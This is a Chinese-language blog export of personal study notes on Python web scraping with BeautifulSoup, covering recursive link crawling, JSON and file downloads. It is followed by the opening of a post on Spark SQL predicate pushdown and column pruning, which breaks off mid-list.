<h4 id="一些BS"><a href="#一些BS" class="headerlink" title="一些BS"></a>一些BS</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findAll(tag, attributes, recursive, text, limit, keywords)</span><br><span class="line">find(tag, attributes, recursive, text, keywords)</span><br><span class="line">• BeautifulSoup 对象</span><br><span class="line">前面代码示例中的 bsObj</span><br><span class="line">• 标签 Tag 对象</span><br><span class="line">BeautifulSoup 对象通过 find 和 findAll，或者直接调用子标签获取的一列对象或单个对象</span><br><span class="line">• NavigableString 对象</span><br><span class="line">用来表示标签里的文字，不是标签（有些函数可以操作和生成 NavigableString 对象，</span><br><span class="line">而不是标签对象）。</span><br><span class="line">• Comment 对象</span><br><span class="line">用来查找 HTML 文档的注释标签，&lt;!-- 像这样 --&gt;</span><br><span class="line">子标签：children</span><br><span class="line">父标签：parent</span><br><span class="line">下一个兄弟标签：next_siblings</span><br><span class="line">上一个兄弟标签：previous_sibling</span><br><span class="line">获取属性：.attrs[&quot;src&quot;]</span><br></pre></td></tr></table></figure>

<h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><p>查表</p>
<h4 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h4><p>举个例子就好，就是表达式的值传给参数，用：隔开</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com/pages/page3.html&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html.read(), <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">bsObj2 = bsObj</span><br><span class="line">bsObj3 = bsObj</span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> bsObj.find(<span class="string">&quot;table&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;giftList&quot;</span>&#125;).children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> bsObj.find(<span class="string">&quot;table&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;giftList&quot;</span>&#125;).tr.next_siblings:</span><br><span class="line">    <span class="built_in">print</span>(sibling)</span><br><span class="line"></span><br><span class="line">images = bsObj2.findAll(<span class="string">&quot;img&quot;</span>, &#123;<span class="string">&quot;src&quot;</span>: re.<span class="built_in">compile</span>(<span class="string">&quot;\.\.\/img\/gifts/img.*\.jpg&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">    <span class="built_in">print</span>(image[<span class="string">&quot;src&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bsObj3.findAll(<span class="keyword">lambda</span> tag: <span class="built_in">len</span>(tag.attrs) == <span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<h4 id="注"><a href="#注" class="headerlink" title="注"></a>注</h4><p>之所以叫网络爬虫（Web crawler）是因为它们可以沿着网络爬行。它们的本质就是一种递<br>归方式。为了找到 URL 链接，它们必须首先获取网页内容，检查这个页面的内容，再寻<br>找另一个 URL，然后获取 URL 对应的网页内容，不断循环这一过程      —- 书中内容</p>
<h3 id="开始采集"><a href="#开始采集" class="headerlink" title="开始采集"></a>开始采集</h3><h4 id="六度迭代"><a href="#六度迭代" class="headerlink" title="六度迭代"></a>六度迭代</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">random.seed(datetime.datetime.now())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLinks</span>(<span class="params">articleurl</span>):</span></span><br><span class="line">    html = urlopen(<span class="string">&quot;http://en.wikipedia.org&quot;</span>+articleurl)</span><br><span class="line">    bsObj = BeautifulSoup(html)</span><br><span class="line">    <span class="keyword">return</span> bsObj.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;bodyContent&quot;</span>&#125;).findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/wiki/)((?!:).)*$&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">links = getLinks(<span class="string">&quot;/wiki/Kevin_Bacon&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(links) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        newArticle = links[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(links)-<span class="number">1</span>)].attrs[<span class="string">&quot;href&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(newArticle)</span><br><span class="line">        links = getLinks(newArticle)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span></span><br></pre></td></tr></table></figure>

<h4 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pages = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLinks</span>(<span class="params">pageUrl</span>):</span></span><br><span class="line">    <span class="keyword">global</span> pages</span><br><span class="line">    html = urlopen(<span class="string">&quot;http://en.wikipedia.org&quot;</span>+pageUrl)</span><br><span class="line">    bsObj = BeautifulSoup(html)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/wiki/)&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;href&#x27;</span> <span class="keyword">in</span> link.attrs:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> pages:</span><br><span class="line">                <span class="comment"># 我们遇到了新页面</span></span><br><span class="line">                newPage = link.attrs[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(newPage)</span><br><span class="line">                pages.add(newPage)</span><br><span class="line">                getLinks(newPage)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getLinks(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="网络地图"><a href="#网络地图" class="headerlink" title="网络地图"></a>网络地图</h4><p>基础迭代</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内链外链</span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">pages = <span class="built_in">set</span>()</span><br><span class="line">random.seed(datetime.datetime.now())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页面所有外链的列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getExternalLinks</span>(<span class="params">bsObj, excludeUrl</span>):</span></span><br><span class="line">    externalLinks = []</span><br><span class="line">    <span class="comment"># 找出所有以&quot;http&quot;或&quot;www&quot;开头且不包含当前URL的链接</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(http|www)((?!&quot;</span>+excludeUrl+<span class="string">&quot;).)*$&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> externalLinks:</span><br><span class="line">                externalLinks.append(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> externalLinks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页面所有内链的列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInternalLinks</span>(<span class="params">bsObj, includeUrl</span>):</span></span><br><span class="line">    internalLinks = []</span><br><span class="line">    <span class="comment"># 找出所有以&quot;/&quot;开头的链接</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/|.*&quot;</span>+includeUrl+<span class="string">&quot;)&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> internalLinks:</span><br><span class="line">                internalLinks.append(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> internalLinks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitAddress</span>(<span class="params">address</span>):</span></span><br><span class="line">    addressParts = address.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> addressParts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNextExternalLink</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRandomExternalLink</span>(<span class="params">startingPage</span>):</span></span><br><span class="line">    html = urlopen(startingPage)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    externalLinks = getExternalLinks(bsObj, splitAddress(startingPage)[<span class="number">0</span>])  <span class="comment"># 不包含当前域名</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(externalLinks) == <span class="number">0</span>:  <span class="comment"># 无外链</span></span><br><span class="line">        internalLinks = getInternalLinks(startingPage, splitAddress(startingPage)[<span class="number">0</span>])  <span class="comment"># 获取内链</span></span><br><span class="line">        <span class="keyword">return</span> getNextExternalLink(internalLinks[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(internalLinks)-<span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> externalLinks[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(externalLinks)-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">followExternalOnly</span>(<span class="params">startingSite</span>):</span></span><br><span class="line">    externalLink = getRandomExternalLink(<span class="string">&quot;http://oreilly.com&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;随机外链是：&quot;</span>+externalLink)</span><br><span class="line">    followExternalOnly(externalLink)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">followExternalOnly(<span class="string">&quot;http://oreilly.com&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>获取所有外链</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内链外链</span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">pages = <span class="built_in">set</span>()</span><br><span class="line">random.seed(datetime.datetime.now())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页面所有外链的列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getExternalLinks</span>(<span class="params">bsObj, excludeUrl</span>):</span></span><br><span class="line">    externalLinks = []</span><br><span class="line">    <span class="comment"># 找出所有以&quot;http&quot;或&quot;www&quot;开头且不包含当前URL的链接</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(http|www)((?!&quot;</span>+excludeUrl+<span class="string">&quot;).)*$&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> externalLinks:</span><br><span class="line">                externalLinks.append(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> externalLinks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页面所有内链的列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInternalLinks</span>(<span class="params">bsObj, includeUrl</span>):</span></span><br><span class="line">    internalLinks = []</span><br><span class="line">    <span class="comment"># 找出所有以&quot;/&quot;开头的链接</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/|.*&quot;</span>+includeUrl+<span class="string">&quot;)&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> internalLinks:</span><br><span class="line">                internalLinks.append(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> internalLinks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitAddress</span>(<span class="params">address</span>):</span></span><br><span class="line">    addressParts = address.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> addressParts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allExtLinks = <span class="built_in">set</span>()</span><br><span class="line">allIntLinks = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAllExternalLinks</span>(<span class="params">siteUrl</span>):</span></span><br><span class="line">    html = urlopen(siteUrl)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    internalLinks = getInternalLinks(bsObj, splitAddress(siteUrl)[<span class="number">0</span>])</span><br><span class="line">    externalLinks = getExternalLinks(bsObj, splitAddress(siteUrl)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> externalLinks:</span><br><span class="line">        <span class="keyword">if</span> link <span class="keyword">not</span> <span class="keyword">in</span> allExtLinks:</span><br><span class="line">            allExtLinks.add(link)</span><br><span class="line">            <span class="built_in">print</span>(link)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> internalLinks:</span><br><span class="line">        <span class="keyword">if</span> link <span class="keyword">not</span> <span class="keyword">in</span> allIntLinks:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;即将获取链接的URL是：&quot;</span>+link)</span><br><span class="line">            allIntLinks.add(link)</span><br><span class="line">            getAllExternalLinks(link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getAllExternalLinks(<span class="string">&quot;http://oreilly.com&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如果有bug不要紧，因为没有科学上网</p>
<h3 id="使用API"><a href="#使用API" class="headerlink" title="使用API"></a>使用API</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一般情况下，程序员可以用 HTTP 协议向 API 发起请求以获取某种信息，API 会用 XML</span><br><span class="line">（eXtensible Markup Language，可扩展标记语言）或 JSON（JavaScript Object Notation，</span><br><span class="line">JavaScript 对象表示）格式返回服务器响应的信息。尽管大多数 API 仍然在用 XML，但是</span><br><span class="line">JSON 正在快速成为数据编码格式的主流选择</span><br><span class="line">																		--- 引用自本书</span><br></pre></td></tr></table></figure>

<p>还是比较头疼的，可能拿国内的API来做做例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用 HTTP 从网络服务获取信息有四种方式：</span><br><span class="line">• GET    获取</span><br><span class="line">• POST   发送</span><br><span class="line">• PUT    更新</span><br><span class="line">• DELETE 删除</span><br></pre></td></tr></table></figure>

<p>JSON和XML的不同样式</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">比如下面的 XML 数据用了 <span class="number">98</span> 个字符：</span><br><span class="line">&lt;user&gt;&lt;firstname&gt;Ryan&lt;/firstname&gt;&lt;lastname&gt;Mitchell&lt;/lastname&gt;&lt;username&gt;Kludgist</span><br><span class="line">&lt;/username&gt;&lt;/user&gt;</span><br><span class="line">同样的 JSON 格式数据：</span><br><span class="line">&#123;<span class="attr">&quot;user&quot;</span>:&#123;<span class="attr">&quot;firstname&quot;</span>:<span class="string">&quot;Ryan&quot;</span>,<span class="attr">&quot;lastname&quot;</span>:<span class="string">&quot;Mitchell&quot;</span>,<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;Kludgist&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不会科学上网真麻烦</p>
<h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>一些小操作</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">json.loads  # 将字符串转化为字典</span><br><span class="line">json.dumps()  # 将字典转化为字符串</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line"># json.dump() 将json信息写进文件</span><br><span class="line">json_info = <span class="string">&quot;&#123;&#x27;age&#x27;: &#x27;12&#x27;&#125;&quot;</span></span><br><span class="line">file = open(&#x27;<span class="number">1.</span>json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf<span class="number">-8</span>&#x27;)</span><br><span class="line">json.dump(json_info,file)</span><br><span class="line"># json.load() 将读取json信息</span><br><span class="line">file = open(&#x27;<span class="number">1.</span>json&#x27;,&#x27;r&#x27;,encoding=&#x27;utf<span class="number">-8</span>&#x27;)</span><br><span class="line">info = json.load(file)</span><br><span class="line">print(info)</span><br><span class="line"></span><br><span class="line"># ~ 代表等价，左为json，右为javascript</span><br><span class="line"><span class="string">&quot;firstName&quot;</span> : <span class="string">&quot;John&quot;</span> ~ firstName = <span class="string">&quot;John&quot;</span></span><br><span class="line">&#123; <span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;John&quot;</span> , <span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Doe&quot;</span> &#125; ~ firstName = <span class="string">&quot;John&quot;</span>; lastName = <span class="string">&quot;Doe&quot;</span></span><br><span class="line"></span><br><span class="line"># 数组可以包含多个对象</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;employees&quot;</span>: [</span><br><span class="line">&#123; <span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;John&quot;</span> , <span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Doe&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;Anna&quot;</span> , <span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Smith&quot;</span> &#125;,</span><br><span class="line">&#123; <span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;Peter&quot;</span> , <span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Jones&quot;</span> &#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># eval 可以把json 转换成 javascript</span><br><span class="line">etc.</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;通过 JSON 字符串来创建对象&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">First Name: &lt;span id=<span class="string">&quot;fname&quot;</span>&gt;&lt;/span&gt;&lt;br /&gt; </span><br><span class="line">Last Name: &lt;span id=<span class="string">&quot;lname&quot;</span>&gt;&lt;/span&gt;&lt;br /&gt; </span><br><span class="line">&lt;/p&gt; </span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">var txt = &#x27;&#123;<span class="attr">&quot;employees&quot;</span>:[&#x27; +</span><br><span class="line">&#x27;&#123;<span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;Bill&quot;</span>,<span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Gates&quot;</span> &#125;,&#x27; +</span><br><span class="line">&#x27;&#123;<span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;George&quot;</span>,<span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Bush&quot;</span> &#125;,&#x27; +</span><br><span class="line">&#x27;&#123;<span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;Thomas&quot;</span>,<span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Carter&quot;</span> &#125;]&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">var obj = eval (<span class="string">&quot;(&quot;</span> + txt + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">document.getElementById(<span class="string">&quot;fname&quot;</span>).innerHTML=obj.employees[<span class="number">1</span>].firstName </span><br><span class="line">document.getElementById(<span class="string">&quot;lname&quot;</span>).innerHTML=obj.employees[<span class="number">1</span>].lastName </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>书上的例子现在看起来感觉很棒</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">jsonString = <span class="string">&#x27;&#123;&quot;arrayOfNums&quot;:[&#123;&quot;number&quot;:0&#125;,&#123;&quot;number&quot;:1&#125;,&#123;&quot;number&quot;:2&#125;],&#x27;</span> \</span><br><span class="line">             <span class="string">&#x27;&quot;arrayOfFruits&quot;:[&#123;&quot;fruit&quot;:&quot;apple&quot;&#125;,&#123;&quot;fruit&quot;:&quot;banana&quot;&#125;,&#123;&quot;fruit&quot;:&quot;pear&quot;&#125;]&#125;&#x27;</span></span><br><span class="line">jsonObj = json.loads(jsonString)</span><br><span class="line"><span class="built_in">print</span>(jsonObj.get(<span class="string">&quot;arrayOfNums&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(jsonObj.get(<span class="string">&quot;arrayOfNums&quot;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(jsonObj.get(<span class="string">&quot;arrayOfNums&quot;</span>)[<span class="number">1</span>].get(<span class="string">&quot;number&quot;</span>) + jsonObj.get(<span class="string">&quot;arrayOfNums&quot;</span>)[<span class="number">2</span>].get(<span class="string">&quot;number&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(jsonObj.get(<span class="string">&quot;arrayOfFruits&quot;</span>)[<span class="number">2</span>].get(<span class="string">&quot;fruit&quot;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果你准备创建一个网站</span><br><span class="line">的后端服务或者创建自己的 API，那么可能都需要让爬虫把数据写入数据库。如果你需要</span><br><span class="line">一个快速简单的方法收集网上的文档，然后存到你的硬盘里，那么可能需要创建一个文件</span><br><span class="line">流（file stream）来实现。如果还要为偶然事件提个醒儿，或者每天定时收集当天累计的数</span><br><span class="line">据，就给自己发一封邮件吧！</span><br><span class="line">																		--- 引用自本书</span><br></pre></td></tr></table></figure>

<h4 id="根据文件的-URL-下载文件"><a href="#根据文件的-URL-下载文件" class="headerlink" title="根据文件的 URL 下载文件"></a>根据文件的 URL 下载文件</h4><p>这个例子是从网上把一个穿山甲下下来，哈哈</p>
<p>下载下来默认是和.py文件同目录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = urlopen(<span class="string">&quot;http://www.pythonscraping.com&quot;</span>)</span><br><span class="line">bsObj = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">imageLocation = bsObj.find(<span class="string">&quot;a&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;logo&quot;</span>&#125;).find(<span class="string">&quot;img&quot;</span>)[<span class="string">&quot;src&quot;</span>]</span><br><span class="line">urlretrieve(imageLocation, <span class="string">&quot;logo.jpg&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(path)  <span class="comment"># 改变当前工作目录</span></span><br><span class="line">os.makedirs(path[, mode])  <span class="comment"># 递归文件夹创建函数。像mkdir(), 但创建的所有intermediate-level文件夹需要包含子文件夹</span></span><br><span class="line">os.path.dirname(path)  <span class="comment"># 返回文件路径</span></span><br></pre></td></tr></table></figure>

<h4 id="Python连接MySQL"><a href="#Python连接MySQL" class="headerlink" title="Python连接MySQL"></a>Python连接MySQL</h4>]]></content>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark SQL谓词下推谓词下推/列裁剪/映射下推</title>
    <url>/2021/08/25/Spark%20SQL%E8%B0%93%E8%AF%8D%E4%B8%8B%E6%8E%A8%E8%B0%93%E8%AF%8D%E4%B8%8B%E6%8E%A8:%E5%88%97%E8%A3%81%E5%89%AA:%E6%98%A0%E5%B0%84%E4%B8%8B%E6%8E%A8/</url>
    <content><![CDATA[<p>又是实习中学习的一天，同时今天提到了谓词下推这个概念，我表示没听过，而且他们说这是很基础的概念，赶紧弥补一下。</p>
<p><a href="https://www.jianshu.com/p/5ff225a70510">参考链接1</a></p>
<span id="more"></span>

<h2 id="谓词下推-Predicate-PushDown"><a href="#谓词下推-Predicate-PushDown" class="headerlink" title="谓词下推 Predicate PushDown"></a>谓词下推 Predicate PushDown</h2><p>谓词下推的目的：<strong>将过滤条件尽可能地下沉到数据源端</strong><br> 谓词，用来描述或判定客体性质、特征或者客体之间关系的词项,英文翻译为<code>predicate</code>，而谓词下推的英文<code>Predicate Pushdown</code>中的谓词指返回<code>bool值</code>即true和false的函数，或是隐式转换为bool的函数。如SQL中的谓词主要有 <code>like</code>、<code>between</code>、<code>is null</code>、<code>in</code>、<code>=</code>、<code>!=</code>等，再比如Spark SQL中的<code>filter</code>算子等。<br> 谓词下推的含义为<strong>将过滤表达式尽可能移动至靠近数据源的位置，以使真正执行时能直接跳过无关的数据</strong>，一般的数据库或查询系统都支持谓词下推。</p>
<h2 id="列裁剪-Column-Pruning-和-映射下推-Project-PushDown"><a href="#列裁剪-Column-Pruning-和-映射下推-Project-PushDown" class="headerlink" title="列裁剪 Column Pruning 和 映射下推 Project PushDown"></a>列裁剪 Column Pruning 和 映射下推 Project PushDown</h2><p>列裁剪和映射下推的目的：<strong>过滤掉查询不需要使用到的列</strong><br> 列裁剪ColumnPruning 指把那些查询<code>不需要的字段过滤掉</code>，使得扫描的数据量减少。如果底层的文件格式为<code>列式存储</code>（比如 Parquet），则可以进一步映射下推，映射可以理解为<code>表结构映射</code>，Parquet每一列的所有值都是连续存储的，所以分区取出每一列的所有值就可以实现<code>TableScan</code>算子，而避免扫描整个表文件内容</p>
<h2 id="Spark-SQL处理SQL流程"><a href="#Spark-SQL处理SQL流程" class="headerlink" title="Spark SQL处理SQL流程"></a>Spark SQL处理SQL流程</h2><p><img src="https://z3.ax1x.com/2021/08/25/hZopuQ.md.png" alt="hZopuQ.md.png"></p>
<ul>
<li><code>词法解析</code>：对SQL语句进行初步结构化，类似于分词</li>
<li><code>语法分析</code>，<code>语义分析</code>：对结构化的SQL进行规则分析，比如判断数据库是否存在，语法是否符合SQL语法规则等</li>
<li><code>逻辑计划</code>：对合规后的SQL生成逻辑执行计划，其中就行语法优化和逻辑改写</li>
<li><code>物理计划</code>：对逻辑计划生成Spark DAG图</li>
